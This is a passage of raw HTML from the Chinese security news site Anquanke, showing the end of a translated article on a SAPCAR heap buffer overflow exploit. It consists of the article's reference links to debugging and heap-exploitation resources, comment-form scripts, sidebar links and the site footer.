&quot;Microsoft YaHei&quot;;">[3] <a href="https://github.com/jfoote/exploitable" _src="https://github.com/jfoote/exploitable">https://github.com/jfoote/exploitable</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[4] <a href="https://github.com/bnagy/crashwalk" _src="https://github.com/bnagy/crashwalk">https://github.com/bnagy/crashwalk</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[5] <a href="https://github.com/longld/peda" _src="https://github.com/longld/peda">https://github.com/longld/peda</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[6] <a href="https://github.com/hugsy/gef" _src="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[7] <a href="https://github.com/pwndbg/pwndbg" _src="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[8] <a href="https://github.com/shellphish/how2heap" _src="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[9] <a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" _src="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[10] <a href="https://github.com/CoreSecurity/pysap" _src="https://github.com/CoreSecurity/pysap">https://github.com/CoreSecurity/pysap</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[11] <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51;hp=64ba17317dc9343f0958755ad04af71ec3da637b" _src="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51;hp=64ba17317dc9343f0958755ad04af71ec3da637b">https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51;hp=64ba17317dc9343f0958755ad04af71ec3da637b</a>&nbsp;</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://www.coresecurity.com/blog/sapcar-heap-buffer-overflow-crash-exploit" target="_blank">原文链接：https://www.coresecurity.com/blog/sapcar-heap-buffer-overflow-crash-exploit</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】SAPCAR堆缓冲区溢出：从crash到exploit - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3976" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
